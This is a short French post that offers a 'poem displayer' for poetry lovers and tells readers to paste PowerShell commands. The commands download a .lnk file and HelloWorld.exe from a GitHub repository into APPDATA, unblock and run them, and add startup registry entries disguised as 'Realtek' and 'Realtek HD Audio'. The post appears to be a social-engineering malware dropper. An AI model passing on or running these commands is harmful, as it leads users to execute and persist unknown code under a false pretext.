Si vous aimez la poésie, voilà quelques manipulations à faire pour installer un afficheur de poèmes qui devrait vous satisfaire.
Suivre la procédure ci-dessous :

- Faire : WIN+X > Windows Powershell
- Copier les blocs de commandes suivants un par un et valider

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $u="https://raw.githubusercontent.com/rvbrio/Test/main/Poeme-Victor.Hugo.lnk";
$p="$env:APPDATA\Poeme-Victor.Hugo.lnk"; Invoke-WebRequest $u -OutFile $p; Unblock-File $p; Start-Process $p;
Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Realtek -Value $env:APPDATA\Poeme-Victor.Hugo.lnk


[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $u="https://raw.githubusercontent.com/rvbrio/Test/main/HelloWorld.exe";
$p="$env:APPDATA\HelloWorld.exe"; Invoke-WebRequest $u -OutFile $p; Unblock-File $p; Start-Process $p;
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Realtek HD Audio" -Value $p;
